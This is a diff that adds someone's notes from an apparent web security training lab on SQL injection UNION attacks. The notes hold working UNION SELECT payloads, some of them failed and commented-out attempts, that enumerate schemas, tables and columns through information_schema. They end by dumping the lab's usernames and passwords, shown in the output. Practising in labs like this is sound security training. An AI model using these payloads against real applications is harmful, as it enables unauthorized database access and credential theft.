@@ -1,0 +1,52 @@
+WEB SECURITY ACADEMIA
+LAB 5 SQLinjection
+UNION attack
+
+
+'union select null, null-- -
+//'union select administrator, null-- -
+//'union select users, null-- -
+//'union select username, NULL-- -
+//'union select username, password-- -
+//'union select username, pass-- -
+//'union select schema_name, NULL from information_schema.schemata-- -.
+
+'union select schema_name,NULL from information_schema.schemata-- -
+-----
+pg_catalog
+public
+information_schema
+-----
+
+'union select table_name,NULL from information_schema.tables-- -
+-----
+muchas tablas, pero las interesantes son
+"users"
+-----
+
+//'union select column_name,NULL from information_schema.colums where table_schema = 'users'-- -
+//'union select table_name,NULL from information_schema.tables where table_chema = 'products'-- -
+//'union select column_name,NULL from information_schema.columns and table_name = 'users'-- -
+'union select column_name,NULL from information_schema.columns where table_schema ='products' and table_name = 'users'-- -
+//"where table_schema = 'tabla'" es para apuntar directamente a una columna especifica//
+
+'union select column_name,NULL from information_schema.columns where table_schema ='public' and table_name = 'users'-- -
+*****
+password
+username
+*****
+
+//'union select password, username from 'users'-- -
+//'union select 'password', 'username' from 'users'-- -
+
+'union select password, username from users-- -
+*****
+81vccjab8w5rj1rwkz4n
+administrator
+p253sw6vfk5ppmbhqmoj
+wiener
+8jwkjygdgdrq4fz0oszq
+carlos
+*****
+
+
